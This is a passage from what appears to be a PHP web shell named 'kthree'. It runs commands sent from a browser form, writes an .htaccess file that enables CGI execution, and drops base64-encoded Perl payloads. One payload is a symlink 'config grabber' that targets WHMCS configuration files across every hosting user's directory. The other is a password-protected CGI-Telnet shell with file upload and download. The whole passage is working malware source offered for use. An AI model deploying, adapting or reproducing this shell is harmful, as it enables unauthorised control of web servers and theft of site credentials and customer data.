5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQ0hFQ0tPVVQvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQ2hlY2tvdXQvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvY2hlY2tvdXQvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQklMTElOR1Mvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQmlsbGluZ3Mvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvYmlsbGluZ3Mvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQkFTS0VUL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0Jhc2tldC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9iYXNrZXQvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvU0VDVVJFL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL1NlY3VyZS9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9zZWN1cmUvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvU0FMRVMvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvU2FsZXMvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvc2FsZXMvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQklMTC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9CaWxsL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2JpbGwvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvUFVSQ0hBU0Uvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvUHVyY2hhc2Uvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvcHVyY2hhc2Uvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQUNDT1VOVC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9BY2NvdW50L3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2FjY291bnQvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvVVNFUi9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9Vc2VyL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3VzZXIvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQ0xJRU5UUy9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9DbGllbnRzL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2NsaWVudHMvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQklMTElOR1Mvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQmlsbGluZ3Mvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvYmlsbGluZ3Mvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvTVkvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvTXkvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvbXkvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvc2VjdXJlL3dobS9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9zZWN1cmUvd2htY3Mvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvcGFuZWwvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvY2xpZW50ZXMvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvY2xpZW50ZS9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9zdXBwb3J0L29yZGVyL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSApOyBmb3JlYWNoIChAYXJyYXkpeyBteSAkY29uZmlnbnlhID0gJF8tPntjb25maWdkaXJ9OyBteSAkdHlwZWNvbmZpZyA9ICRfLT57dHlwZX07IHN5bWxpbmsoIiRjb25maWdueWEiLCJzeW1saW5rX2NvbmZpZy8kdXNlcm55YS0kdHlwZWNvbmZpZy50eHQiKTsgbWtkaXIgInN5bWxpbmtfY29uZmlnLyR1c2VybnlhLSR0eXBlY29uZmlnLnR4dDQwNCI7IHN5bWxpbmsoIiRjb25maWdueWEiLCJzeW1saW5rX2NvbmZpZy8kdXNlcm55YS0kdHlwZWNvbmZpZy50eHQ0MDQvcHBxLnR4dCIpOyBjb3B5KCJzeW1saW5rX2NvbmZpZy9uZW11LnR4dCIsInN5bWxpbmtfY29uZmlnLyR1c2VybnlhLSR0eXBlY29uZmlnLnR4dDQwNC8uaHRhY2Nlc3MiKSA7IH0gfSBwcmludCAic3VjY2VzcyI7DQp9DQpzdWIgSGVscA0Kew0KcHJpbnQgIjxjb2RlPiBIb3cgVG8gVXNlciBTeW1saW5rICsgQ29uZmlnIEdyYWJiZXI/IEp1c3QgS2xpayBTeW1saW5rICsgQ29uZmlnIEdyYWJiZXI8YnI+IjsNCnByaW50ICIgVGhlbiBDaGVjayBEaXJzIEJ5IEVudGVyIFRoZSBVUkw8YnI+IjsNCnByaW50ICIgRXhhbXBsZTogc2l0ZS5jb20vY2dpZGlycy9zeW1saW5rX2NvbmZpZzxicj4iOw0KcHJpbnQgIiBGb3IgU3ltbGluayBKdXN0IEFkZCBJbiBVcmw8YnI+IjsNCnByaW50ICIgRXhhbXBsZTogc2l0ZS5jb20vY2dpZGlycy9zeW1saW5rX2NvbmZpZy9yb290LzwvY29kZT4iOw0KfQ0Kc3ViIFNlbmRGaWxlVG9Ccm93c2VyDQp7DQpsb2NhbCgkU2VuZEZpbGUpID0gQF87DQppZihvcGVuKFNFTkRGSUxFLCAkU2VuZEZpbGUpKSAjIGZpbGUgb3BlbmVkIGZvciByZWFkaW5nDQp7DQppZigkV2luTlQpDQp7DQpiaW5tb2RlKFNFTkRGSUxFKTsNCmJpbm1vZGUoU1RET1VUKTsNCn0NCiRGaWxlU2l6ZSA9IChzdGF0KCRTZW5kRmlsZSkpWzddOw0KKCRGaWxlbmFtZSA9ICRTZW5kRmlsZSkgPX4gbSEoW14vXlxcXSopJCE7DQpwcmludCAiQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXVua25vd25cbiI7DQpwcmludCAiQ29udGVudC1MZW5ndGg6ICRGaWxlU2l6ZVxuIjsNCnByaW50ICJDb250ZW50LURpc3Bvc2l0aW9uOiBhdHRhY2htZW50OyBmaWxlbmFtZT0kMVxuXG4iOw0KcHJpbnQgd2hpbGUoPFNFTkRGSUxFPik7DQpjbG9zZShTRU5ERklMRSk7DQp9DQplbHNlICMgZmFpbGVkIHRvIG9wZW4gZmlsZQ0Kew0KJlByaW50UGFnZUhlYWRlcigiZiIpOw0KcHJpbnQgIjxjb2RlPkZhaWxlZCB0byBkb3dubG9hZCAkU2VuZEZpbGU6ICQhPC9jb2RlPiI7DQomUHJpbnRGaWxlRG93bmxvYWRGb3JtOw0KJlByaW50UGFnZUZvb3RlcjsNCn0NCn0NCg0KDQpzdWIgQmVnaW5Eb3dubG9hZA0Kew0KIyBnZXQgZnVsbHkgcXVhbGlmaWVkIHBhdGggb2YgdGhlIGZpbGUgdG8gYmUgZG93bmxvYWRlZA0KaWYoKCRXaW5OVCAmICgkVHJhbnNmZXJGaWxlID1+IG0vXlxcfF4uOi8pKSB8DQooISRXaW5OVCAmICgkVHJhbnNmZXJGaWxlID1+IG0vXlwvLykpKSAjIHBhdGggaXMgYWJzb2x1dGUNCnsNCiRUYXJnZXRGaWxlID0gJFRyYW5zZmVyRmlsZTsNCn0NCmVsc2UgIyBwYXRoIGlzIHJlbGF0aXZlDQp7DQpjaG9wKCRUYXJnZXRGaWxlKSBpZigkVGFyZ2V0RmlsZSA9ICRDdXJyZW50RGlyKSA9fiBtL1tcXFwvXSQvOw0KJFRhcmdldEZpbGUgLj0gJFBhdGhTZXAuJFRyYW5zZmVyRmlsZTsNCn0NCg0KaWYoJE9wdGlvbnMgZXEgImdvIikgIyB3ZSBoYXZlIHRvIHNlbmQgdGhlIGZpbGUNCnsNCiZTZW5kRmlsZVRvQnJvd3NlcigkVGFyZ2V0RmlsZSk7DQp9DQplbHNlICMgd2UgaGF2ZSB0byBzZW5kIG9ubHkgdGhlIGxpbmsgcGFnZQ0Kew0KJlByaW50RG93bmxvYWRMaW5rUGFnZSgkVGFyZ2V0RmlsZSk7DQp9DQp9DQpzdWIgVXBsb2FkRmlsZQ0Kew0KIyBpZiBubyBmaWxlIGlzIHNwZWNpZmllZCwgcHJpbnQgdGhlIHVwbG9hZCBmb3JtIGFnYWluDQppZigkVHJhbnNmZXJGaWxlIGVxICIiKQ0Kew0KJlByaW50UGFnZUhlYWRlcigiZiIpOw0KJlByaW50RmlsZVVwbG9hZEZvcm07DQomUHJpbnRQYWdlRm9vdGVyOw0KcmV0dXJuOw0KfQ0KJlByaW50UGFnZUhlYWRlcigiYyIpOw0KDQojIHN0YXJ0IHRoZSB1cGxvYWRpbmcgcHJvY2Vzcw0KcHJpbnQgIjxjb2RlPlVwbG9hZGluZyAkVHJhbnNmZXJGaWxlIHRvICRDdXJyZW50RGlyLi4uPGJyPiI7DQoNCiMgZ2V0IHRoZSBmdWxsbHkgcXVhbGlmaWVkIHBhdGhuYW1lIG9mIHRoZSBmaWxlIHRvIGJlIGNyZWF0ZWQNCmNob3AoJFRhcmdldE5hbWUpIGlmICgkVGFyZ2V0TmFtZSA9ICRDdXJyZW50RGlyKSA9fiBtL1tcXFwvXSQvOw0KJFRyYW5zZmVyRmlsZSA9fiBtIShbXi9eXFxdKikkITsNCiRUYXJnZXROYW1lIC49ICRQYXRoU2VwLiQxOw0KDQokVGFyZ2V0RmlsZVNpemUgPSBsZW5ndGgoJGlueydmaWxlZGF0YSd9KTsNCiMgaWYgdGhlIGZpbGUgZXhpc3RzIGFuZCB3ZSBhcmUgbm90IHN1cHBvc2VkIHRvIG92ZXJ3cml0ZSBpdA0KaWYoLWUgJFRhcmdldE5hbWUgJiYgJE9wdGlvbnMgbmUgIm92ZXJ3cml0ZSIpDQp7DQpwcmludCAiRmFpbGVkOiBEZXN0aW5hdGlvbiBmaWxlIGFscmVhZHkgZXhpc3RzLjxicj4iOw0KfQ0KZWxzZSAjIGZpbGUgaXMgbm90IHByZXNlbnQNCnsNCmlmKG9wZW4oVVBMT0FERklMRSwgIj4kVGFyZ2V0TmFtZSIpKQ0Kew0KYmlubW9kZShVUExPQURGSUxFKSBpZiAkV2luTlQ7DQpwcmludCBVUExPQURGSUxFICRpbnsnZmlsZWRhdGEnfTsNCmNsb3NlKFVQTE9BREZJTEUpOw0KcHJpbnQgIlRyYW5zZmVyZWQgJFRhcmdldEZpbGVTaXplIEJ5dGVzLjxicj4iOw0KcHJpbnQgIkZpbGUgUGF0aDogJFRhcmdldE5hbWU8YnI+IjsNCn0NCmVsc2UNCnsNCnByaW50ICJGYWlsZWQ6ICQhPGJyPiI7DQp9DQp9DQpwcmludCAiPC9jb2RlPiI7DQomUHJpbnRDb21tYW5kTGluZUlucHV0Rm9ybTsNCiZQcmludFBhZ2VGb290ZXI7DQp9DQoNCnN1YiBEb3dubG9hZEZpbGUNCnsNCiMgaWYgbm8gZmlsZSBpcyBzcGVjaWZpZWQsIHByaW50IHRoZSBkb3dubG9hZCBmb3JtIGFnYWluDQppZigkVHJhbnNmZXJGaWxlIGVxICIiKQ0Kew0KJlByaW50UGFnZUhlYWRlcigiZiIpOw0KJlByaW50RmlsZURvd25sb2FkRm9ybTsNCiZQcmludFBhZ2VGb290ZXI7DQpyZXR1cm47DQp9DQoNCiMgZ2V0IGZ1bGx5IHF1YWxpZmllZCBwYXRoIG9mIHRoZSBmaWxlIHRvIGJlIGRvd25sb2FkZWQNCmlmKCgkV2luTlQgJiAoJFRyYW5zZmVyRmlsZSA9fiBtL15cXHxeLjovKSkgfA0KKCEkV2luTlQgJiAoJFRyYW5zZmVyRmlsZSA9fiBtL15cLy8pKSkgIyBwYXRoIGlzIGFic29sdXRlDQp7DQokVGFyZ2V0RmlsZSA9ICRUcmFuc2ZlckZpbGU7DQp9DQplbHNlICMgcGF0aCBpcyByZWxhdGl2ZQ0Kew0KY2hvcCgkVGFyZ2V0RmlsZSkgaWYoJFRhcmdldEZpbGUgPSAkQ3VycmVudERpcikgPX4gbS9bXFxcL10kLzsNCiRUYXJnZXRGaWxlIC49ICRQYXRoU2VwLiRUcmFuc2ZlckZpbGU7DQp9DQoNCmlmKCRPcHRpb25zIGVxICJnbyIpICMgd2UgaGF2ZSB0byBzZW5kIHRoZSBmaWxlDQp7DQomU2VuZEZpbGVUb0Jyb3dzZXIoJFRhcmdldEZpbGUpOw0KfQ0KZWxzZSAjIHdlIGhhdmUgdG8gc2VuZCBvbmx5IHRoZSBsaW5rIHBhZ2UNCnsNCiZQcmludERvd25sb2FkTGlua1BhZ2UoJFRhcmdldEZpbGUpOw0KfQ0KfQ0KDQomUmVhZFBhcnNlOw0KJkdldENvb2tpZXM7DQoNCiRTY3JpcHRMb2NhdGlvbiA9ICRFTlZ7J1NDUklQVF9OQU1FJ307DQokU2VydmVyTmFtZSA9ICRFTlZ7J1NFUlZFUl9OQU1FJ307DQokUnVuQ29tbWFuZCA9ICRpbnsnYyd9Ow0KJFRyYW5zZmVyRmlsZSA9ICRpbnsnZid9Ow0KJE9wdGlvbnMgPSAkaW57J28nfTsNCg0KJEFjdGlvbiA9ICRpbnsnYSd9Ow0KJEFjdGlvbiA9ICJjb21tYW5kIiBpZigkQWN0aW9uIGVxICIiKTsNCg0KIyBnZXQgdGhlIGRpcmVjdG9yeSBpbiB3aGljaCB0aGUgY29tbWFuZHMgd2lsbCBiZSBleGVjdXRlZA0KJEN1cnJlbnREaXIgPSAkaW57J2QnfTsNCmNob3AoJEN1cnJlbnREaXIgPSBgJENtZFB3ZGApIGlmKCRDdXJyZW50RGlyIGVxICIiKTsNCmlmKCRBY3Rpb24gZXEgImNvbW1hbmQiKSAjIHVzZXIgd2FudHMgdG8gcnVuIGEgY29tbWFuZA0Kew0KJkV4ZWN1dGVDb21tYW5kOw0KfQ0KZWxzaWYoJEFjdGlvbiBlcSAidXBsb2FkIikgIyB1c2VyIHdhbnRzIHRvIHVwbG9hZCBhIGZpbGUNCnsNCiZVcGxvYWRGaWxlOw0KfQ0KZWxzaWYoJEFjdGlvbiBlcSAiZG93bmxvYWQiKSAjIHVzZXIgd2FudHMgdG8gZG93bmxvYWQgYSBmaWxlDQp7DQomRG93bmxvYWRGaWxlOw0KfQ0KZWxzaWYoJEFjdGlvbiBlcSAic3ltY29uZmlnIikNCnsNCiZQcmludFBhZ2VIZWFkZXI7DQpwcmludCAmU3ltQ29uZmlnOw0KfWVsc2lmKCRBY3Rpb24gZXEgImhlbHAiKQ0Kew0KJlByaW50UGFnZUhlYWRlcjsNCnByaW50ICZIZWxwOw0KfQ==";
	$cgi = fopen($file_cgi, "w");
	fwrite($cgi, base64_decode($cgi_script));
	fwrite($htcgi, $isi_htcgi);
	chmod($file_cgi, 0755);
        chmod($memeg, 0755);
	echo "<br><center>Done ... <a href='kthree_cgi/cgi2.kthree' target='_blank'>Klik Here</a>";
}
 elseif($_GET['k3'] == 'cmd') {
	echo "<form method='post'>
	<font style='text-decoration: underline;'>".$user."@".gethostbyname($_SERVER['HTTP_HOST']).":~# </font>
	<input type='text' size='30' height='10' name='cmd'><input type='submit' name='k3_cmd' value='>>'>
	</form>";
	if($_POST['k3_cmd']) {
		echo "<pre>".exe($_POST['cmd'])."</pre>";
	}
} 

elseif($_GET['k3'] == 'cgi') {
	$cgi_dir = mkdir('kthree_cgi', 0755);
        chdir('kthree_cgi');
	$file_cgi = "cgi.kthree";
        $memeg = ".htaccess";
	$isi_htcgi = "Options Indexes Includes ExecCGI FollowSymLinks\nAddType application/x-httpd-cgi .kthree\nAddHandler cgi-script .kthree\nAddHandler cgi-script .kthree";
	$htcgi = fopen(".htaccess", "w");
	$cgi_script = "IyEvdXNyL2Jpbi9wZXJsIC1JL3Vzci9sb2NhbC9iYW5kbWluDQp1c2UgTUlNRTo6QmFzZTY0Ow0KJFZlcnNpb249ICJDR0ktVGVsbmV0IFZlcnNpb24gMS4zIjsNCiRFZGl0UGVyc2lvbj0iPGZvbnQgc3R5bGU9J3RleHQtc2hhZG93OiAwcHggMHB4IDZweCByZ2IoMjU1LCAwLCAwKSwgMHB4IDBweCA1cHggcmdiKDMwMCwgMCwgMCksIDBweCAwcHggNXB4IHJnYigzMDAsIDAsIDApOyBjb2xvcjojZmZmZmZmOyBmb250LXdlaWdodDpib2xkOyc+YjM3NGsgLSBDR0ktVGVsbmV0PC9mb250PiI7DQoNCiRQYXNzd29yZCA9ICJrdWRhanVtcGluZyI7DQpzdWIgSXNfV2luKCl7DQoJJG9zID0gJnRyaW0oJEVOVnsiU0VSVkVSX1NPRlRXQVJFIn0pOw0KCWlmKCRvcyA9fiBtL3dpbi9pKXsNCgkJcmV0dXJuIDE7DQoJfQ0KCWVsc2V7DQoJCXJldHVybiAwOw0KCX0NCn0NCiRXaW5OVCA9ICZJc19XaW4oKTsJCQkJIyBZb3UgbmVlZCB0byBjaGFuZ2UgdGhlIHZhbHVlIG9mIHRoaXMgdG8gMSBpZg0KCQkJCQkJCQkjIHlvdSdyZSBydW5uaW5nIHRoaXMgc2NyaXB0IG9uIGEgV2luZG93cyBOVA0KCQkJCQkJCQkjIG1hY2hpbmUuIElmIHlvdSdyZSBydW5uaW5nIGl0IG9uIFVuaXgsIHlvdQ0KCQkJCQkJCQkjIGNhbiBsZWF2ZSB0aGUgdmFsdWUgYXMgaXQgaXMuDQoNCiROVENtZFNlcCA9ICImIjsJCQkJIyBUaGlzIGNoYXJhY3RlciBpcyB1c2VkIHRvIHNlcGVyYXRlIDIgY29tbWFuZHMNCgkJCQkJCQkJIyBpbiBhIGNvbW1hbmQgbGluZSBvbiBXaW5kb3dzIE5ULg0KDQokVW5peENtZFNlcCA9ICI7IjsJCQkJIyBUaGlzIGNoYXJhY3RlciBpcyB1c2VkIHRvIHNlcGVyYXRlIDIgY29tbWFuZHMNCgkJCQkJCQkJIyBpbiBhIGNvbW1hbmQgbGluZSBvbiBVbml4Lg0KDQokQ29tbWFuZFRpbWVvdXREdXJhdGlvbiA9IDEwMDAwOwkjIFRpbWUgaW4gc2Vjb25kcyBhZnRlciBjb21tYW5kcyB3aWxsIGJlIGtpbGxlZA0KCQkJCQkJCQkjIERvbid0IHNldCB0aGlzIHRvIGEgdmVyeSBsYXJnZSB2YWx1ZS4gVGhpcyBpcw0KCQkJCQkJCQkjIHVzZWZ1bCBmb3IgY29tbWFuZHMgdGhhdCBtYXkgaGFuZyBvciB0aGF0DQoJCQkJCQkJCSMgdGFrZSB2ZXJ5IGxvbmcgdG8gZXhlY3V0ZSwgbGlrZSAiZmluZCAvIi4NCgkJCQkJCQkJIyBUaGlzIGlzIHZhbGlkIG9ubHkgb24gVW5peCBzZXJ2ZXJzLiBJdCBpcw0KCQkJCQkJCQkjIGlnbm9yZWQgb24gTlQgU2VydmVycy4NCg0KJFNob3dEeW5hbWljT3V0cHV0ID0gMTsJCQkjIElmIHRoaXMgaXMgMSwgdGhlbiBkYXRhIGlzIHNlbnQgdG8gdGhlDQoJCQkJCQkJCSMgYnJvd3NlciBhcyBzb29uIGFzIGl0IGlzIG91dHB1dCwgb3RoZXJ3aXNlDQoJCQkJCQkJCSMgaXQgaXMgYnVmZmVyZWQgYW5kIHNlbmQgd2hlbiB0aGUgY29tbWFuZA0KCQkJCQkJCQkjIGNvbXBsZXRlcy4gVGhpcyBpcyB1c2VmdWwgZm9yIGNvbW1hbmRzIGxpa2UNCgkJCQkJCQkJIyBwaW5nLCBzbyB0aGF0IHlvdSBjYW4gc2VlIHRoZSBvdXRwdXQgYXMgaXQNCgkJCQkJCQkJIyBpcyBiZWluZyBnZW5lcmF0ZWQuDQoNCiMgRE9OJ1QgQ0hBTkdFIEFOWVRISU5HIEJFTE9XIFRISVMgTElORSBVTkxFU1MgWU9VIEtOT1cgV0hBVCBZT1UnUkUgRE9JTkcgISENCg0KJENtZFNlcCA9ICgkV2luTlQgPyAkTlRDbWRTZXAgOiAkVW5peENtZFNlcCk7DQokQ21kUHdkID0gKCRXaW5OVCA/ICJjZCIgOiAicHdkIik7DQokUGF0aFNlcCA9ICgkV2luTlQgPyAiXFwiIDogIi8iKTsNCiRSZWRpcmVjdG9yID0gKCRXaW5OVCA/ICIgMj4mMSAxPiYyIiA6ICIgMT4mMSAyPiYxIik7DQokY29scz0gMTUwOw0KJHJvd3M9IDI2Ow0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBSZWFkcyB0aGUgaW5wdXQgc2VudCBieSB0aGUgYnJvd3NlciBhbmQgcGFyc2VzIHRoZSBpbnB1dCB2YXJpYWJsZXMuIEl0DQojIHBhcnNlcyBHRVQsIFBPU1QgYW5kIG11bHRpcGFydC9mb3JtLWRhdGEgdGhhdCBpcyB1c2VkIGZvciB1cGxvYWRpbmcgZmlsZXMuDQojIFRoZSBmaWxlbmFtZSBpcyBzdG9yZWQgaW4gJGlueydmJ30gYW5kIHRoZSBkYXRhIGlzIHN0b3JlZCBpbiAkaW57J2ZpbGVkYXRhJ30uDQojIE90aGVyIHZhcmlhYmxlcyBjYW4gYmUgYWNjZXNzZWQgdXNpbmcgJGlueyd2YXInfSwgd2hlcmUgdmFyIGlzIHRoZSBuYW1lIG9mDQojIHRoZSB2YXJpYWJsZS4gTm90ZTogTW9zdCBvZiB0aGUgY29kZSBpbiB0aGlzIGZ1bmN0aW9uIGlzIHRha2VuIGZyb20gb3RoZXIgQ0dJDQojIHNjcmlwdHMuDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgUmVhZFBhcnNlIA0Kew0KCWxvY2FsICgqaW4pID0gQF8gaWYgQF87DQoJbG9jYWwgKCRpLCAkbG9jLCAka2V5LCAkdmFsKTsNCgkNCgkkTXVsdGlwYXJ0Rm9ybURhdGEgPSAkRU5WeydDT05URU5UX1RZUEUnfSA9fiAvbXVsdGlwYXJ0XC9mb3JtLWRhdGE7IGJvdW5kYXJ5PSguKykkLzsNCg0KCWlmKCRFTlZ7J1JFUVVFU1RfTUVUSE9EJ30gZXEgIkdFVCIpDQoJew0KCQkkaW4gPSAkRU5WeydRVUVSWV9TVFJJTkcnfTsNCgl9DQoJZWxzaWYoJEVOVnsnUkVRVUVTVF9NRVRIT0QnfSBlcSAiUE9TVCIpDQoJew0KCQliaW5tb2RlKFNURElOKSBpZiAkTXVsdGlwYXJ0Rm9ybURhdGEgJiAkV2luTlQ7DQoJCXJlYWQoU1RESU4sICRpbiwgJEVOVnsnQ09OVEVOVF9MRU5HVEgnfSk7DQoJfQ0KDQoJIyBoYW5kbGUgZmlsZSB1cGxvYWQgZGF0YQ0KCWlmKCRFTlZ7J0NPTlRFTlRfVFlQRSd9ID1+IC9tdWx0aXBhcnRcL2Zvcm0tZGF0YTsgYm91bmRhcnk9KC4rKSQvKQ0KCXsNCgkJJEJvdW5kYXJ5ID0gJy0tJy4kMTsgIyBwbGVhc2UgcmVmZXIgdG8gUkZDMTg2NyANCgkJQGxpc3QgPSBzcGxpdCgvJEJvdW5kYXJ5LywgJGluKTsgDQoJCSRIZWFkZXJCb2R5ID0gJGxpc3RbMV07DQoJCSRIZWFkZXJCb2R5ID1+IC9cclxuXHJcbnxcblxuLzsNCgkJJEhlYWRlciA9ICRgOw0KCQkkQm9keSA9ICQnOw0KIAkJJEJvZHkgPX4gcy9cclxuJC8vOyAjIHRoZSBsYXN0I